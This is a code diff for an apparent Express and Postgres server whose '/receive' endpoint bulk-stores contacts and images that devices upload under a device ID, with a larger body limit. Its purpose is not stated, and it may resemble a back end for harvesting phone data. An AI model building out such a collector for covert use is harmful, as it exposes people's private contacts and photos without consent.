@@ -3,7 +3,7 @@ const bodyParser = require("body-parser");
 const { Pool } = require("pg");
 
 const app = express();
-app.use(bodyParser.json({ limit: "50mb" }));
+app.use(bodyParser.json({ limit: "100mb" }));
 
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
@@ -41,27 +41,47 @@ app.post("/receive", async (req, res) => {
   try {
     const { type, device_id, data } = req.body;
 
-    // Register user
     await pool.query(
       "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
       [device_id]
     );
 
+    if (!Array.isArray(data) || data.length === 0) {
+      return res.send("No data");
+    }
+
+    // ===== CONTACTS =====
     if (type === "contacts") {
+      const values = [];
+      const placeholders = data.map((_, i) => {
+        values.push(data[i]);
+        return `($1, $${i + 2})`;
+      });
+
       await pool.query(
-        "INSERT INTO contacts (device_id, contact_data) VALUES ($1, $2)",
-        [device_id, data]
+        `INSERT INTO contacts (device_id, contact_data)
+         VALUES ${placeholders.join(",")}`,
+        [device_id, ...values]
       );
     }
 
+    // ===== IMAGES =====
     if (type === "images") {
+      const values = [];
+      const placeholders = data.map((_, i) => {
+        values.push(data[i]);
+        return `($1, $${i + 2})`;
+      });
+
       await pool.query(
-        "INSERT INTO images (device_id, image_data) VALUES ($1, $2)",
-        [device_id, data]
+        `INSERT INTO images (device_id, image_data)
+         VALUES ${placeholders.join(",")}`,
+        [device_id, ...values]
       );
     }
 
-    res.send("Saved");
+    res.send("Bulk Saved ✅");
+
   } catch (err) {
     console.error(err);
     res.status(500).send("Error");
